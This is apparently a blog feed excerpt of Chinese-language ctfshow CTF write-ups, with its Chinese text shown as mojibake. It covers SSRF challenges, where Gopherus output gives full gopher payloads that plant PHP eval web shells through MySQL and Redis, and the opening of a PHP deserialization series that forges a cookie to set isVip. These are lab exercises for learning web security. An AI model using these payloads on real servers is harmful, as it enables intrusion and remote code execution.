invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æ£€æŸ¥ $url æ˜¯å¦ä»¥ &quot;<span class="exturl" data-url="aHR0cDovL2N0Zg==">http://ctf</span>.â€œå¼€å¤´ï¼Œå¹¶ä¸”ä»¥â€.show&quot; ç»“å°¾ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰ï¼Œ å‰é¢å‘¢å°±åˆ©ç”¨ @ç¬¦å·å°±å¯ä»¥ç»•è¿‡ï¼Œåé¢åˆ©ç”¨ get ä¼ å‚æ–¹å¼ç»•è¿‡ï¼š</p><blockquote><p><span class="exturl" data-url="aHR0cDovL2N0Zi5AMTI3LjAuMC4xL2ZsYWcucGhwP3Nob3c=">http://ctf.@127.0.0.1/flag.php?show</span></p></blockquote><h1 id="web359"><a class="markdownIt-Anchor" href="#web359">#</a> web359ï¼š</h1><p>â€‹éšä¾¿è¾“å…¥äº†ä¸€ä¸ªè´¦å·å¯†ç åï¼Œè·³è½¬åˆ° check.php æ–‡ä»¶ï¼ŒæŠ“åŒ…å post å‡ºç°äº†ä¸€ä¸ª returlï¼Œç”±æ­¤ï¼Œåˆ©ç”¨ gopher åè®®æ„é€ æ”»å‡»ï¼Œåˆ©ç”¨ gopherus ç”Ÿæˆ gopher è¯­å¥æ”»å‡»ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿MSI)-[/home/g01den/Tools/Gopherus]</span><br><span class="line">â””â”€# python2 gopherus.py --exploit mysql</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  ________              .__</span><br><span class="line"> /  _____/  ____ ______ |  |__   ___________ __ __  ______</span><br><span class="line">/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/</span><br><span class="line">\    \_\  (  &lt;_&gt; )  |_&gt; &gt;   Y  \  ___/|  | \/  |  /\___ \</span><br><span class="line"> \______  /\____/|   __/|___|  /\___  &gt;__|  |____//____  &gt;</span><br><span class="line">        \/       |__|        \/     \/                 \/</span><br><span class="line"></span><br><span class="line">                author: $_SpyD3r_$</span><br><span class="line"></span><br><span class="line">For making it work username should not be password protected!!!</span><br><span class="line"></span><br><span class="line">Give MySQL username: root</span><br><span class="line">Give query to execute: select &quot;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&quot; into outfile &#x27;/var/www/html/2.php&#x27;;</span><br><span class="line"></span><br><span class="line">Your gopher link is ready to do SSRF :</span><br><span class="line"></span><br><span class="line">gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%4c%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%40%65%76%61%6c%28%24%5f%50%4f%53%54%5b%22%63%6d%64%22%5d%29%3b%3f%e3%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%27%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%32%2e%70%68%70%27%3b%01%00%00%00%01</span><br><span class="line"></span><br><span class="line">-----------Made-by-SpyD3r-----------</span><br></pre></td></tr></table></figure><p>â€‹ç”Ÿæˆçš„ gopher åè®®ä¸èƒ½ç›´æ¥ç”¨ï¼Œéœ€è¦ç»è¿‡ url ç¼–ç ä¹‹åæ‰èƒ½ç”¨ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:3306/<span class="built_in">_</span><span class="comment">%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%254c%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%2522%253c%253f%2570%2568%2570%2520%2540%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2522%2563%256d%2564%2522%255d%2529%253b%253f%25e3%253e%2522%2520%2569%256e%2574%256f%2520%256f%2575%2574%2566%2569%256c%2565%2520%2527%252f%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%252f%2532%252e%2570%2568%2570%2527%253b%2501%2500%2500%2500%2501</span></span><br></pre></td></tr></table></figure><p>â€‹ä¸çŸ¥é“ä¸ºå•¥ï¼Œæˆ‘è‡ªå·±çš„ payload ç”¨ä¸äº†ï¼Œè´´ä¸€ä¸ªåˆ«äººçš„å§ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:3306/<span class="built_in">_</span><span class="comment">%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%2545%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%2522%253c%253f%2570%2568%2570%2520%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2531%255d%2529%253b%253f%253e%2522%2520%2569%256e%2574%256f%2520%256f%2575%2574%2566%2569%256c%2565%2520%2522%252f%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%252f%2531%252e%2570%2568%2570%2522%2501%2500%2500%2500%2501</span></span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åè®¿é—® 1.php ç”¨ post ä¼ ä¸€ä¸ª 1=system (â€œcat+/flag.txtâ€); å³å¯ã€‚</p><h1 id="web360"><a class="markdownIt-Anchor" href="#web360">#</a> web360ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>â€‹è¿™ä¹ˆç”¨ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿MSI)-[/home/g01den/Tools/Gopherus]</span><br><span class="line">â””â”€# python2 gopherus.py --exploit redis</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  ________              .__</span><br><span class="line"> /  _____/  ____ ______ |  |__   ___________ __ __  ______</span><br><span class="line">/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/</span><br><span class="line">\    \_\  (  &lt;_&gt; )  |_&gt; &gt;   Y  \  ___/|  | \/  |  /\___ \</span><br><span class="line"> \______  /\____/|   __/|___|  /\___  &gt;__|  |____//____  &gt;</span><br><span class="line">        \/       |__|        \/     \/                 \/</span><br><span class="line"></span><br><span class="line">                author: $_SpyD3r_$</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Ready To get SHELL</span><br><span class="line"></span><br><span class="line">What do you want?? (ReverseShell/PHPShell): php</span><br><span class="line"></span><br><span class="line">Give web root location of server (default is /var/www/html):</span><br><span class="line">Give PHP Payload (We have default PHP Shell): &lt;?php eval($_post[1]);?&gt;</span><br><span class="line"></span><br><span class="line">Your gopher link is Ready to get PHP Shell:</span><br><span class="line"></span><br><span class="line">gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2428%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_post%5B1%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A</span><br><span class="line"></span><br><span class="line">When it&#x27;s done you can get PHP Shell in /shell.php at the server with `cmd` as parmeter.</span><br><span class="line"></span><br><span class="line">-----------Made-by-SpyD3r-----------</span><br></pre></td></tr></table></figure><p>â€‹ä¸çŸ¥ä¸ºå•¥ï¼Œæˆ‘çš„è¿˜æ˜¯ç”¨ä¸äº†ï¼Œä¸è¿‡ï¼Œç…§ç†æ¥è¯´ï¼Œå‘é€äº†ä¹‹åè®¿é—® shell.php å°±èƒ½ rce äº†ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;web351&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#web351&quot;&gt;#&lt;/a&gt; web351ï¼š&lt;/h1&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;</summary>
      
    
    
    
    <category term="Webç‹—çš„è‡ªæˆ‘å®‰æ…°" scheme="http://blog.g01den.top/categories/Web/"/>
    
    
    <category term="Web" scheme="http://blog.g01den.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow-ååºåˆ—åŒ–</title>
    <link href="http://blog.g01den.top/posts/4fb535d6.html"/>
    <id>http://blog.g01den.top/posts/4fb535d6.html</id>
    <published>2024-09-17T12:19:47.000Z</published>
    <updated>2024-12-09T13:37:57.278Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ä¸€äº›åŸºç¡€"><a class="markdownIt-Anchor" href="#ä¸€äº›åŸºç¡€">#</a> ä¸€äº›åŸºç¡€ï¼š</h1><blockquote><p>private å˜é‡ä¼šè¢«åºåˆ—åŒ–ä¸ºï¼š\x00 ç±»å \x00 å˜é‡å<br> protected å˜é‡ä¼šè¢«åºåˆ—åŒ–ä¸º: \x00*\x00 å˜é‡å<br> public å˜é‡ä¼šè¢«åºåˆ—åŒ–ä¸ºï¼šå˜é‡å</p><p>__sleep ()    // åœ¨å¯¹è±¡è¢«åºåˆ—åŒ–ä¹‹å‰è¿è¡Œ  *</p><p>__wakeup ()   // å°†åœ¨ååºåˆ—åŒ–ä¹‹åç«‹å³è°ƒç”¨ï¼ˆå½“ååºåˆ—åŒ–æ—¶å˜é‡ä¸ªæ•°ä¸å®é™…ä¸ç¬¦æ˜¯ä¼šç»•è¿‡ï¼‰  *<br> å¦‚æœç±»ä¸­åŒæ—¶å®šä¹‰äº† __unserialize () å’Œ __wakeup () ä¸¤ä¸ªé­”æœ¯æ–¹æ³•ï¼Œ åˆ™åªæœ‰ __unserialize () æ–¹æ³•ä¼šç”Ÿæ•ˆï¼Œ<strong>wakeup () æ–¹æ³•ä¼šè¢«å¿½ç•¥ã€‚æ­¤ç‰¹æ€§è‡ª PHP 7.4.0 èµ·å¯ç”¨ã€‚</strong></p><p>construct () // å½“å¯¹è±¡è¢«åˆ›å»ºæ—¶ï¼Œä¼šè§¦å‘è¿›è¡Œåˆå§‹åŒ–<br>__destruct () // å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘__toString ()ï¼š // å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘<br>__call () // åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘__callStatic () // åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘<br>__get () // è·å¾—ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨ï¼Œç”¨äºä»ä¸å¯è®¿é—®çš„</p><p>å±æ€§è¯»å–æ•°æ®ï¼ˆä¸å¯è®¿é—®çš„å±æ€§åŒ…æ‹¬ï¼š1. å±æ€§æ˜¯ç§æœ‰å‹ã€‚2. ç±»ä¸­ä¸å­˜åœ¨çš„æˆå‘˜å˜é‡ï¼‰<br>__set () // ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§</p><p>__isset () // åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨ isset () æˆ– empty () è§¦å‘<br>__unset () // åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨ unset () æ—¶è§¦å‘</p><p>__toString () // æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘<br>__invoke () // å½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶</p></blockquote><h1 id="web254"><a class="markdownIt-Anchor" href="#web254">#</a> web254</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;isVip=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>â€‹è¿™ä¸ªé¢˜å°±æ˜¯ç®€å•çš„é€»è¾‘ï¼Œé¦–å…ˆæ˜¯ç™»é™†ï¼Œåˆ¤æ–­è´¦å·å¯†ç æ˜¯å¦ä¸º xxxxxxï¼Œæ˜¯çš„è¯ isVip åˆ™è¿”å› trueï¼Œä¹‹åæ£€æµ‹ isVip æ˜¯å¦ä¸º trueï¼Œæ˜¯çš„è¯å°±è¾“å‡º flagã€‚</p><p>â€‹å› æ­¤ï¼Œç›´æ¥ get ä¼ ä¸¤ä¸ªå‚æ•°ï¼Œusername å’Œ password éƒ½æ˜¯ xxxxxx å³å¯å‡º flagã€‚</p><h1 id="web255"><a class="markdownIt-Anchor" href="#web255">#</a> web255ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>â€‹é€»è¾‘æŒºç®€å•çš„ï¼Œå°±æ˜¯ä» cookie å–ä¸€ä¸ªåºåˆ—åŒ–åçš„å­—ç¬¦ä¸²ï¼Œè¿›è¡Œååºåˆ—åŒ–ï¼Œè¿™ä¸ªç±»å°±å®ä¾‹åŒ–æˆä¸€ä¸ªå¯¹è±¡ userï¼Œç„¶åå¯¹è¿™ä¸ªå¯¹è±¡è¿›è¡Œæ“ä½œï¼Œè¿›è¡Œ loginï¼Œä½†æ˜¯ login åªä¼šè¿”å›ä¸€ä¸ªçœŸæˆ–è€…å‡ï¼Œä¸ä¼šæ“ä½œ isVip å‚æ•°ï¼Œä¹‹åçš„ checkVip ä¼šæ£€æµ‹ isVip çš„å€¼ï¼Œä¸ºçœŸåˆ™è¾“å‡º flagï¼Œæ‰€ä»¥ï¼Œç”Ÿæˆçš„åºåˆ—åŒ–å­—ç¬¦ä¸²è¦æ±‚æ˜¯ isVip å±æ€§å¾—æ˜¯çœŸï¼Œæ‰€ä»¥ç”Ÿæˆçš„è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line">?username=xxxxxx&amp;password=xxxxxx</span><br></pre></td></tr></table></figure><h1 id="web256"><a class="markdownIt-Anchor" href="#web256">#</a> web256ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 